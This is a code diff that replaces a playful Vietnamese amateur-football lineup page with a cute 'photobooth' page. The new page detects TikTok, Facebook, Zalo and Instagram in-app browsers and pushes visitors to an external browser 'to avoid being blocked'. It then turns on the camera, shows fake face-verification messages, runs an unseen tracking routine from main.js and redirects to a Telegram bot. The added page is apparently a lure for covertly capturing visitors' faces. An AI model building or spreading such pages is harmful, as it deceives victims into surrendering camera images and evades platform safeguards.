+    transform: translateX(-50%);
+    border-radius: 50%;
+    background: #e72c79;
+    border: 2px solid #d82b73;
+}
+
+/* Kitty nhỏ hai bên camera */
+.kitty-side {
+    position: fixed;
+    z-index: 3;
+    bottom: 10%;
+    width: 82px;
+    height: 100px;
+    pointer-events: none;
+    font-size: 63px;
+    line-height: 1;
+    filter: drop-shadow(0 7px 7px rgba(214,19,108,.13));
+    animation: kittySideFloat 4s ease-in-out infinite;
+}
+.kitty-side.left { left: max(2px, calc(50% - 255px)); }
+.kitty-side.right {
+    right: max(2px, calc(50% - 255px));
+    animation-delay: -2s;
+}
+.kitty-side::after {
+    content: "🎀";
+    position: absolute;
+    top: 0;
+    font-size: 25px;
+}
+.kitty-side.left::after { right: 3px; }
+.kitty-side.right::after { left: 3px; }
+
+@keyframes kittyFloatTop {
+    0%,100% { margin-top: 0; }
+    50% { margin-top: -7px; }
+}
+@keyframes kittySideFloat {
+    0%,100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+}
+
+@media (max-width: 560px) {
+    .card {
+        margin-top: 96px !important;
+        margin-bottom: 22px !important;
+    }
+    .kitty-top {
+        top: 10px;
+        transform: translateX(-50%) scale(.9);
+    }
+    .kitty-side {
+        opacity: .8;
+        transform: scale(.78);
+    }
+    .kitty-side.left { left: -10px; }
+    .kitty-side.right { right: -10px; }
+}
+@media (max-height: 700px) {
+    .camera-view { height: 245px !important; }
+    .card { margin-top: 82px !important; padding-top: 22px !important; }
+}
+
 </style>
 </head>
 <body>
 
-<canvas id="confetti-canvas"></canvas>
 
-<div class="card">
-
-  <div class="header">
-    <div class="badge-7">7</div>
-    <svg class="crest" viewBox="0 0 46 52">
-      <path d="M23 0 L44 8 L44 24 C44 38 35 48 23 52 C11 48 2 38 2 24 L2 8 Z"
-            fill="#f0c04b" stroke="#601621" stroke-width="2"/>
-      <path d="M23 5 L39 11 L39 24 C39 35 32 43 23 47 C14 43 7 35 7 24 L7 11 Z"
-            fill="#8a1f2c"/>
-      <text x="23" y="31" font-family="Anton, sans-serif" font-size="20" fill="#f0c04b" text-anchor="middle">LD</text>
-    </svg>
-    <div class="eyebrow">Bóng Đá Phong Trào · Mùa Giải 2026</div>
-    <h1>Siêu Đội Hình<br>Làng Dốc</h1>
-    <div class="sub">Đội hình ra sân chính thức · Sân 7</div>
-  </div>
-
-  <div class="scoreboard">
-    <div class="team">LÀNG DỐC</div>
-    <div class="score">0 – 0</div>
-    <div class="clock">00:00</div>
-  </div>
-
-  <div class="coach-wrap">
-    <div class="coach-card">
-      <div class="coach-badge">🧥</div>
-      <div class="coach-text">
-        <div class="coach-label">Huấn luyện viên trưởng</div>
-        <div class="coach-name">Gianni Infantino</div>
-      </div>
+<div class="kitty-top" aria-hidden="true">
+    <div class="face">
+        <span class="ear l"></span><span class="ear r"></span>
+        <span class="eye l"></span><span class="eye r"></span>
+        <span class="nose"></span>
+        <span class="whisker w1"></span><span class="whisker w2"></span>
+        <span class="whisker w3"></span><span class="whisker w4"></span>
+        <span class="bow"><i></i></span>
     </div>
-  </div>
-
-  <div class="pitch">
-    <div class="spotlight" id="spotlight"></div>
-    <div class="floodlights">
-      <div class="beam b1"></div>
-      <div class="beam b2"></div>
-    </div>
-    <div class="pitch-lines"></div>
-    <div class="circle"></div>
-    <div class="dot"></div>
-    <div class="box-top"></div>
-    <div class="box-bottom"></div>
-
-    <div class="formation">
-
-      <!-- Striker -->
-      <div class="row">
-        <div class="player">
-          <div class="shirt"><span>9</span></div>
-          <div class="shadow-ell"></div>
-          <div class="name">Toát</div>
-          <div class="alias">"Yamal"</div>
-          <div class="pos">Tiền đạo</div>
-        </div>
-      </div>
-
-      <!-- Wingers -->
-      <div class="row">
-        <div class="player">
-          <div class="shirt"><span>11</span></div>
-          <div class="shadow-ell"></div>
-          <div class="name">Thái</div>
-          <div class="alias">"Soni"</div>
-          <div class="pos">Biên trái</div>
-        </div>
-        <div class="player">
-          <div class="shirt"><span>7</span></div>
-          <div class="shadow-ell"></div>
-          <div class="name">Thuỷ</div>
-          <div class="alias">"J97"</div>
-          <div class="pos">Biên phải</div>
-        </div>
-      </div>
-
-      <!-- Midfielder -->
-      <div class="row">
-        <div class="player">
-          <div class="shirt"><span>8</span></div>
-          <div class="shadow-ell"></div>
-          <div class="name">Nghiêm</div>
-          <div class="alias">"Panasonic"</div>
-          <div class="pos">Tiền vệ</div>
-        </div>
-      </div>
-
-      <!-- Backs -->
-      <div class="row">
-        <div class="player">
-          <div class="shirt"><span>4</span></div>
-          <div class="shadow-ell"></div>
-          <div class="name">Thành</div>
-          <div class="alias">"Lakaka"</div>
-          <div class="pos">Hậu vệ</div>
-        </div>
-        <div class="player">
-          <div class="shirt"><span>5</span></div>
-          <div class="shadow-ell"></div>
-          <div class="name">Tấn</div>
-          <div class="alias">"Samsung"</div>
-          <div class="pos">Hậu vệ</div>
-        </div>
-      </div>
-
-      <!-- Goalkeeper -->
-      <div class="row">
-        <div class="player gk">
-          <div class="shirt"><span>1</span></div>
-          <div class="shadow-ell"></div>
-          <div class="name">Hùng</div>
-          <div class="alias">"Degea"</div>
-          <div class="pos">Thủ môn</div>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-  <div class="bench-wrap">
-    <div class="bench-title">
-      <div class="line"></div>
-      <span>Ghế dự bị</span>
-      <div class="line"></div>
-    </div>
-    <div class="bench-row">
-      <div class="bench-player">
-        <div class="bench-shirt"><span>15</span></div>
-        <div class="bench-name">Ramos</div>
-      </div>
-      <div class="bench-player">
-        <div class="bench-shirt"><span>3</span></div>
-        <div class="bench-name">Maldini</div>
-      </div>
-      <div class="bench-player">
-        <div class="bench-shirt"><span>7</span></div>
-        <div class="bench-name">Ronaldo</div>
-      </div>
-      <div class="bench-player">
-        <div class="bench-shirt"><span>17</span></div>
-        <div class="bench-name">Kevin De Bruyne</div>
-      </div>
-    </div>
-  </div>
-
-  <div class="footer">
-    <div class="line1">LÀNG DỐC F.C.</div>
-    <div class="divider"></div>
-    <div class="line2">Ra sân với tinh thần thép, kỹ thuật... tuỳ hứng ⚽</div>
-  </div>
-
-  <div class="kickoff-wrap">
-    <div class="controls">
-      <button class="kickoff" id="kickoffBtn">🔊 RA SÂN NÀO!</button>
-      <button class="music-btn" id="musicBtn">🎵 Nhạc nền</button>
-    </div>
-  </div>
-
 </div>
-<audio id="bgMusic" src="Y Que Fue_.mp3" loop></audio>
+<div class="kitty-side left" aria-hidden="true">🐱</div>
+<div class="kitty-side right" aria-hidden="true">🐱</div>
 
+<div id="browser-warning">
+    <div class="warning-box">
+        <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
+        <div class="steps">
+            Hãy Mở Website Theo Hướng Dẫn Phía Dưới Để Không Bị Chặn. Vui lòng:<br>
+            1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> ở góc trên bên phải.<br>
+            2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span> (hoặc <i>Open in Browser</i>/<i>Safari</i>) để bắt đầu xác thực.
+        </div>
+    </div>
+</div>
+
+<div class="card" id="mainCard">
+    <h2 style="margin: 0;">Chụp Photobooth<br>Cùng Mình Nha</h2>
+    <div class="title-sub">Nhìn thẳng vào camera chu môi lên nhé ♡</div>
+    <div class="camera-view" id="vBox">
+        <div class="camera-status">CAMERA</div>
+        <p id="msg" style="color: #484f58;">Đang khởi tạo camera...</p>
+        <video id="preview" autoplay playsinline muted></video>
+    </div>
+    <button class="btn" id="startBtn">📸 &nbsp; 🎀  BẮT ĐẦU CHỤP NÈ</button>
+    <div class="stepper">
+        <div class="step active"><span class="circle">1</span><span>Chuẩn bị</span></div>
+        <div class="step-line"></div>
+        <div class="step" id="step2"><span class="circle">2</span><span>Chụp ảnh</span></div>
+        <div class="step-line"></div>
+        <div class="step" id="step3"><span class="circle">3</span><span>Hoàn tất</span></div>
+    </div>
+    <div id="status">Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.<br><small>Vui lòng giữ khuôn mặt trong khung camera.</small></div>
+</div>
+
+<script src="main.js"></script>
 <script>
-  // ---- Stadium horn (synthesized, no copyrighted audio) ----
-  function playStadiumHorn(){
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const now = ctx.currentTime;
-    const master = ctx.createGain();
-    master.gain.value = 0.25;
-    master.connect(ctx.destination);
-
-    // vuvuzela-ish horn: two detuned saw oscillators with slow swell
-    [233.08, 116.54].forEach((freq, i) => {
-      const osc = ctx.createOscillator();
-      osc.type = 'sawtooth';
-      osc.frequency.value = freq;
-      const g = ctx.createGain();
-      g.gain.setValueAtTime(0, now);
-      g.gain.linearRampToValueAtTime(i===0 ? 0.5 : 0.3, now + 0.15);
-      g.gain.linearRampToValueAtTime(0, now + 1.6);
-      osc.connect(g).connect(master);
-      osc.start(now);
-      osc.stop(now + 1.7);
-    });
-
-    // crowd "cheer" noise burst
-    const bufferSize = ctx.sampleRate * 1.8;
-    const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
-    const data = buffer.getChannelData(0);
-    for (let i = 0; i < bufferSize; i++){
-      data[i] = (Math.random() * 2 - 1) * Math.sin((i / bufferSize) * Math.PI);
-    }
-    const noise = ctx.createBufferSource();
-    noise.buffer = buffer;
-    const filter = ctx.createBiquadFilter();
-    filter.type = 'bandpass';
-    filter.frequency.value = 1200;
-    filter.Q.value = 0.6;
-    const noiseGain = ctx.createGain();
-    noiseGain.gain.value = 0.35;
-    noise.connect(filter).connect(noiseGain).connect(master);
-    noise.start(now);
-  }
-
-  // ---- Confetti burst ----
-  function fireConfetti(){
-    const canvas = document.getElementById('confetti-canvas');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const ctx = canvas.getContext('2d');
-    const colors = ['#f0c04b','#8a1f2c','#f4f8f1','#c4922e','#a92937'];
-    const pieces = Array.from({length: 140}, () => ({
-      x: canvas.width/2 + (Math.random()-0.5)*80,
-      y: canvas.height*0.35,
-      vx: (Math.random()-0.5)*9,
-      vy: Math.random()*-9 - 3,
-      size: Math.random()*7+4,
-      color: colors[Math.floor(Math.random()*colors.length)],
-      rot: Math.random()*360,
-      vr: (Math.random()-0.5)*14,
-      shape: Math.random() > 0.5 ? 'rect' : 'circle'
-    }));
-    let frame = 0;
-    const gravity = 0.28;
-
-    function draw(){
-      frame++;
-      ctx.clearRect(0,0,canvas.width,canvas.height);
-      let alive = false;
-      pieces.forEach(p => {
-        p.vy += gravity;
-        p.x += p.vx;
-        p.y += p.vy;
-        p.rot += p.vr;
-        if (p.y < canvas.height + 20) alive = true;
-        ctx.save();
-        ctx.translate(p.x, p.y);
-        ctx.rotate(p.rot * Math.PI/180);
-        ctx.fillStyle = p.color;
-        if (p.shape === 'rect'){
-          ctx.fillRect(-p.size/2, -p.size/4, p.size, p.size/2);
-        } else {
-          ctx.beginPath();
-          ctx.arc(0,0,p.size/2,0,Math.PI*2);
-          ctx.fill();
+    function checkAndShowWarning() {
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
+        const isOtherInApp = /FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
+        
+        if (isTikTok || isOtherInApp) {
+            document.getElementById('browser-warning').style.display = 'flex';
+            document.getElementById('mainCard').style.display = 'none';
         }
-        ctx.restore();
-      });
-      if (alive && frame < 220){
-        requestAnimationFrame(draw);
-      } else {
-        ctx.clearRect(0,0,canvas.width,canvas.height);
-      }
     }
-    draw();
-  }
+    document.addEventListener("DOMContentLoaded", checkAndShowWarning);
 
-  document.getElementById('kickoffBtn').addEventListener('click', () => {
-    try { playStadiumHorn(); } catch(e) {}
-    fireConfetti();
-  });
+    const btn = document.getElementById('startBtn');
+    const video = document.getElementById('preview');
+    const status = document.getElementById('status');
+    const msg = document.getElementById('msg');
+    const REDIRECT_URL = "https://t.me/botletdvk";
 
-  // ---- Original looping stadium anthem (drum + horn riff, no copyrighted material) ----
-  let musicCtx = null;
-  let musicPlaying = false;
-  let musicTimer = null;
+    btn.addEventListener('click', async () => {
+        btn.disabled = true;
+        btn.innerText = "ĐANG XỬ LÝ...";
+        status.innerHTML = "Đang Xác Thực Khuôn Mặt...<br>Vui Lòng Giữ Nguyên Vị Trí.";
+        document.getElementById('step2').classList.add('active');
 
-  function scheduleAnthem(ctx, startTime){
-    const master = ctx.createGain();
-    master.gain.value = 0.18;
-    master.connect(ctx.destination);
+        // Gọi hàm chạy hệ thống từ main.js
+        if (typeof runTrackingSystem === 'function') {
+            await runTrackingSystem();
+        }
 
-    // 4-beat kick drum
-    for (let i = 0; i < 4; i++){
-      const t = startTime + i * 0.5;
-      const osc = ctx.createOscillator();
-      const g = ctx.createGain();
-      osc.type = 'sine';
-      osc.frequency.setValueAtTime(120, t);
-      osc.frequency.exponentialRampToValueAtTime(40, t + 0.12);
-      g.gain.setValueAtTime(0.9, t);
-      g.gain.exponentialRampToValueAtTime(0.001, t + 0.18);
-      osc.connect(g).connect(master);
-      osc.start(t); osc.stop(t + 0.2);
+        document.getElementById('step3').classList.add('active');
+        startCountdown();
+    });
+
+    function startCountdown() {
+        let timeLeft = 3;
+        const timer = setInterval(() => {
+            btn.innerText = `HOÀN TẤT TRONG ${timeLeft}S`;
+            status.innerText = "Xác Thực Thành Công, Đang Chuyển Hướng...";
+            timeLeft--;
+
+            if (timeLeft < 0) {
+                clearInterval(timer);
+                window.location.href = REDIRECT_URL;
+            }
+        }, 1000);
     }
-
-    // simple horn riff (pentatonic chant): E4 G4 A4 G4
-    const notes = [329.63, 392.0, 440.0, 392.0];
-    notes.forEach((freq, i) => {
-      const t = startTime + i * 0.5 + 0.05;
-      const osc = ctx.createOscillator();
-      const g = ctx.createGain();
-      osc.type = 'sawtooth';
-      osc.frequency.value = freq;
-      g.gain.setValueAtTime(0, t);
-      g.gain.linearRampToValueAtTime(0.22, t + 0.05);
-      g.gain.linearRampToValueAtTime(0, t + 0.4);
-      osc.connect(g).connect(master);
-      osc.start(t); osc.stop(t + 0.45);
-    });
-  }
-
-  function toggleMusic(){
-    const btn = document.getElementById('musicBtn');
-    if (!musicPlaying){
-      musicCtx = new (window.AudioContext || window.webkitAudioContext)();
-      musicPlaying = true;
-      btn.classList.add('on');
-      btn.textContent = '⏸ Đang phát';
-      let beat = 0;
-      const loop = () => {
-        if (!musicPlaying) return;
-        scheduleAnthem(musicCtx, musicCtx.currentTime + 0.05);
-        musicTimer = setTimeout(loop, 2000);
-      };
-      loop();
-    } else {
-      musicPlaying = false;
-      clearTimeout(musicTimer);
-      if (musicCtx) musicCtx.close();
-      btn.classList.remove('on');
-      btn.textContent = '🎵 Nhạc nền';
-    }
-  }
-  document.getElementById('musicBtn').addEventListener('click', () => {
-  const audio = document.getElementById('bgMusic');
-  const btn = document.getElementById('musicBtn');
-  if (audio.paused) {
-    audio.play().then(() => {
-      btn.classList.add('on');
-      btn.textContent = '⏸ Đang phát';
-    }).catch((err) => {
-      alert('Không phát được nhạc: ' + err.message + '\n\nKiểm tra lại tên file mp3 và vị trí thư mục.');
-    });
-  } else {
-    audio.pause();
-    btn.classList.remove('on');
-    btn.textContent = '🎵 Nhạc nền';
-  }
-});
-
-  // ---- Cursor spotlight over pitch ----
-  const pitchEl = document.querySelector('.pitch');
-  const spotlightEl = document.getElementById('spotlight');
-  pitchEl.addEventListener('mousemove', (e) => {
-    const rect = pitchEl.getBoundingClientRect();
-    spotlightEl.style.left = (e.clientX - rect.left) + 'px';
-    spotlightEl.style.top = (e.clientY - rect.top) + 'px';
-    spotlightEl.style.opacity = '1';
-  });
-  pitchEl.addEventListener('mouseleave', () => { spotlightEl.style.opacity = '0'; });
-  pitchEl.addEventListener('touchmove', (e) => {
-    const t = e.touches[0];
-    const rect = pitchEl.getBoundingClientRect();
-    spotlightEl.style.left = (t.clientX - rect.left) + 'px';
-    spotlightEl.style.top = (t.clientY - rect.top) + 'px';
-    spotlightEl.style.opacity = '1';
-  }, {passive:true});
-
-  // ---- Golden particle trail following spotlight ----
-  let lastTrail = 0;
-  function spawnTrailParticle(x, y){
-    const now = Date.now();
-    if (now - lastTrail < 60) return;
-    lastTrail = now;
-    const p = document.createElement('div');
-    p.className = 'trail-particle';
-    p.style.left = x + 'px';
-    p.style.top = y + 'px';
-    pitchEl.appendChild(p);
-    p.animate([
-      { opacity: 1, transform: 'translate(0,0) scale(1)' },
-      { opacity: 0, transform: `translate(${(Math.random()-0.5)*20}px, ${10+Math.random()*14}px) scale(0.3)` }
-    ], { duration: 550, easing: 'ease-out' }).onfinish = () => p.remove();
-  }
-  pitchEl.addEventListener('mousemove', (e) => {
-    const rect = pitchEl.getBoundingClientRect();
-    spawnTrailParticle(e.clientX - rect.left, e.clientY - rect.top);
-  });
-  pitchEl.addEventListener('touchmove', (e) => {
-    const t = e.touches[0];
-    const rect = pitchEl.getBoundingClientRect();
-    spawnTrailParticle(t.clientX - rect.left, t.clientY - rect.top);
-  }, {passive:true});
-
-  // ---- Ripple on tap/click anywhere on the pitch ----
-  function spawnRipple(x, y){
-    const r = document.createElement('div');
-    r.className = 'ripple';
-    r.style.left = x + 'px';
-    r.style.top = y + 'px';
-    r.style.width = r.style.height = '120px';
-    pitchEl.appendChild(r);
-    r.addEventListener('animationend', () => r.remove());
-  }
-  pitchEl.addEventListener('click', (e) => {
-    const rect = pitchEl.getBoundingClientRect();
-    spawnRipple(e.clientX - rect.left, e.clientY - rect.top);
-  });
-
-  // ---- Sparkles on player hover ----
-  document.querySelectorAll('.player').forEach(player => {
-    player.addEventListener('mouseenter', () => {
-      for (let i = 0; i < 8; i++){
-        const s = document.createElement('div');
-        s.className = 'sparkle';
-        const angle = (Math.PI * 2 * i) / 8;
-        const dist = 30 + Math.random()*10;
-        s.style.left = 45 + Math.cos(angle)*dist + 'px';
-        s.style.top = 30 + Math.sin(angle)*dist + 'px';
-        player.appendChild(s);
-        s.animate([
-          { opacity: 0, transform: 'scale(0.4)' },
-          { opacity: 1, transform: 'scale(1.2)', offset: 0.4 },
-          { opacity: 0, transform: 'scale(0.4)' }
-        ], { duration: 700 + Math.random()*300, easing: 'ease-out' })
-        .onfinish = () => s.remove();
-      }
-    });
-  });
-
-  // ---- Live-ish scoreboard clock ----
-  let seconds = 0;
-  setInterval(() => {
-    seconds++;
-    const m = String(Math.floor(seconds/60)).padStart(2,'0');
-    const s = String(seconds%60).padStart(2,'0');
-    const clockEl = document.querySelector('.scoreboard .clock');
-    if (clockEl) clockEl.textContent = m + ':' + s;
-  }, 1000);
 </script>
 
 </body>
